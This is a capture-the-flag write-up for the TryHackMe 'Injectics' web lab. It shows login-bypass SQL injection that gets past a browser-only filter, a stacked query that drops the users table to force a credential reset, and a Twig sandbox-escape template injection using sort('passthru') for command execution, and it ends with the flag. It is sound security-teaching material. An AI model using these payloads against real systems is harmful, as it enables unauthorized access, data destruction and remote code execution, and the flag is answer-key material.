# TryHackMe: Injectics

- **Machine Name:** Injectics
- **Difficulty:** Medium
- **Category**: Web
-----

#### 1. Reconnaissance

After obtaining the target IP and connecting to the TryHackMe VPN, we start with directory fuzzing using `ffuf`, as `nmap` only found an open port 80 (HTTP):

```
╭─░▒▓    /home/raine   
╰─ ffuf -u 'http://10.80.158.221:80/FUZZ' -w /usr/share/wordlists/dirb/big.txt  
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://10.80.158.221:80/FUZZ  
:: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
________________________________________________  
  
.htpasswd               [Status: 403, Size: 278, Words: 20]  
.htaccess               [Status: 403, Size: 278, Words: 20]  
css                     [Status: 301, Size: 312, Words: 20]  
flags                   [Status: 301, Size: 314, Words: 20]  
javascript              [Status: 301, Size: 319, Words: 20]  
js                      [Status: 301, Size: 311, Words: 20]  
phpmyadmin              [Status: 301, Size: 319, Words: 20]  
server-status           [Status: 403, Size: 278, Words: 20]  
vendor                  [Status: 301, Size: 315, Words: 20]

```

**Interesting findings:**

- `/flags` (Access denied — 403 Forbidden).
    
- Two login pages: `/login.php` and `/adminLogin007.php`.
    

In the source code of the main page, there is a comment left by the developer:

```html
<!-- Website developed by John Tim - dev@injectics.thm-->

<!-- Mails are stored in mail.log file-->

```

Navigating to `/mail.log`, we find an email with critical information:

```
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm

```

1. A service is configured to check the database state **every minute**. If the `users` table is deleted or corrupted, it automatically restores it with default credentials.
    
2. Default credentials:
    
    - `superadmin@injectics.thm` : `superSecurePasswd101`
        
    - `dev@injectics.thm` : `devPasswd123`
        

Attempting a direct login with these credentials on both login pages fails.

#### 2. Client-Side Filter Bypass

On the `/login.php` page, a `script.js` file is included, which protects against basic SQL injections on the client side:
Full /script.js - HERE

JavaScript

```js
// Snippet from /script.js
const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
```

Since the filtering happens only in the browser, we can intercept the traffic (e.g., using Burp Suite) and send a POST request directly to the backend (`/functions.php`), completely ignoring the JS protection. We use `#` to comment out the rest of the SQL query:

**Payload:** `username=superadmin@injectics.thm'#&password=a&function=login`

This successfully bypasses the check and logs us in.

<img width="1582" height="687" alt="image" src="https://github.com/user-attachments/assets/337ab6fc-58a4-4b6c-8ff8-38704432e6a6" />

#### 3. SQL Injection & Database Drop

In the control panel, there is a feature to update team statistics (Leaderboard). Testing shows that the database is MySQL (both `#` and `--` work as comments). The backend SQL query likely looks like this:

SQL

```sql
UPDATE leaderboard SET gold = 1, silver = 1, bronze = 1 WHERE rank = 1
```

Recalling the automatic restore logic from `mail.log`, we need to destroy the `users` table to trigger the script and reset the admin passwords to default. We exploit the vulnerability:

**Payload:**

HTTP

```
rank=1;%20DROP%20TABLE%20users;&country=a&gold=222&silver=2222&bronze=2222
```

We wait about a minute for the cron script to run, and successfully log into `/adminLogin007.php` with the default password `superSecurePasswd101`.

<img width="1567" height="725" alt="image" src="https://github.com/user-attachments/assets/645462cb-e1aa-4c71-a4f9-42c6634e43be" />


#### 4. SSTI & Sandbox Bypass (RCE)

In the admin panel, the `/update_profile.php` endpoint has a feature to change the username.

<img width="1915" height="358" alt="image" src="https://github.com/user-attachments/assets/254acff9-6bd8-49df-8ec0-90526b67a868" />

<img width="352" height="137" alt="image" src="https://github.com/user-attachments/assets/d033f08e-0024-4174-9cbb-ed12b945b5ac" />

We test the input field for Server-Side Template Injection (SSTI): Inputting `{{7*7}}` returns `49`. The concept is confirmed.

<img width="226" height="98" alt="image" src="https://github.com/user-attachments/assets/4b347b93-2bc5-4743-81b3-7b361f53467e" />

Since this is a PHP application, the `{{}}` syntax indicates the use of the **Twig** template engine. Attempting classic RCE payloads results in an error: `The callable passed to the "map" filter must be a Closure in sandbox mode...`

This means Twig is running in Sandbox mode.

**Why `sort` bypasses the sandbox:** In older versions of Twig, the `sort` filter accepts a callable (a function) to define the sorting logic. By passing a dangerous PHP system function like `passthru` as an argument to `sort`, Twig applies this function to the elements of our array under the hood. The array element becomes the argument for the system function, allowing us to execute OS commands.

**Adapted Payload for Command Execution:**

Twig

```
{{['ls -la flags/',1]|sort('passthru')|join}}
```

_(The `join` filter is used to output the resulting array as a string)._

We get the command output and read the flag! 

<img width="1874" height="101" alt="image" src="https://github.com/user-attachments/assets/76f87db2-da96-4222-8a5b-ab40e1b17a97" />

**Flag:** `THM{5735172b6c147f4dd649872f73e0fdea}`

---
